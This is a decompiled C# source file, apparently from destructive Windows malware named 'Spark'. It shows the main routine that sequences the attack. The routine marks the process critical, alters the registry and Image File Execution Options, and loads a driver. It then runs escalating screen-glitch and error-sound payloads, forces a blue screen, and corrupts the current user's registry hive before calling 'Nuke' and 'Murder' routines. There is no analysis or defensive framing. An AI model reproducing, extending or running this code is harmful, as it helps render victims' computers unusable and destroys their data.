using System;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Spark
{
	// Token: 0x02000005 RID: 5
	internal class Threads
	{
		// Token: 0x06000017 RID: 23 RVA: 0x000024C8 File Offset: 0x000006C8
		public static void Main()
		{
			Destructive.CriticalMode(1UL);
			RegistryEdits.GeneralChanges();
			RegistryEdits.ImageFileExecutionOptions();
			Driver.Register();
			Driver.Load();
			if (!Variables.KillOnReboot)
			{
				Files.KillOnReboot();
				Task task = Task.Run(delegate()
				{
					Threads.StartPayloads();
				});
				Task.Run(delegate()
				{
					Watchdog.CheckIFEO();
				});
				Thread.Sleep(180000);
				Destructive.RandomScreenOfDeath();
				task.Wait();
				return;
			}
			new Thread(new ThreadStart(Standard.GlitchCards)).Start();
			Thread.Sleep(5000);
			new Thread(new ThreadStart(Standard.GlitchCards)).Start();
			new Thread(new ThreadStart(Standard.PrintRotate)).Start();
			Thread.Sleep(5000);
			Destructive.Corrupt(Registry.CurrentUser);
			new Thread(new ThreadStart(Standard.GlitchCards)).Start();
			new Thread(new ThreadStart(Standard.ErrorSounds)).Start();
			new Thread(new ThreadStart(Standard.PrintRotate)).Start();
			Destructive.Nuke();
			Thread.Sleep(30000);
			Destructive.Murder();
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002611 File Offset: 0x00000811
		private static void LowerTimer()
		{
			if (Variables.BetweenPayloads > 10000)
			{
				Variables.BetweenPayloads -= 5000;
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002630 File Offset: 0x00000830
		public static void StartPayloads()
		{
			for (;;)
			{
				Thread.Sleep(Variables.BetweenPayloads);
				Threads.LowerTimer();
				new Thread(new ThreadStart(Standard.ErrorSounds)).Start();
				Thread.Sleep(Variables.BetweenPayloads);
				Threads.LowerTimer();
				new Thread(new ThreadStart(Standard.ShowAllWindows)).Start();
				Thread.Sleep(Variables.BetweenPayloads);
				Threads.LowerTimer();
				new Thread(new ThreadStart(Standard.SendMessagePayload)).Start();
				Thread.Sleep(Variables.BetweenPayloads);
				Threads.LowerTimer();
				new Thread(new ThreadStart(Standard.ShootingStars)).Start();
				Thread.Sleep(3000);
				new Thread(new ThreadStart(Standard.ShootingStars)).Start();
				Thread.Sleep(Variables.BetweenPayloads);
				Threads.LowerTimer();
				new Thread(new ThreadStart(Standard.GlitchCards)).Start();
				Thread.Sleep(Variables.BetweenPayloads);
				Threads.LowerTimer();
				new Thread(new ThreadStart(Standard.PrintRotate)).Start();
			}
		}
	}
}
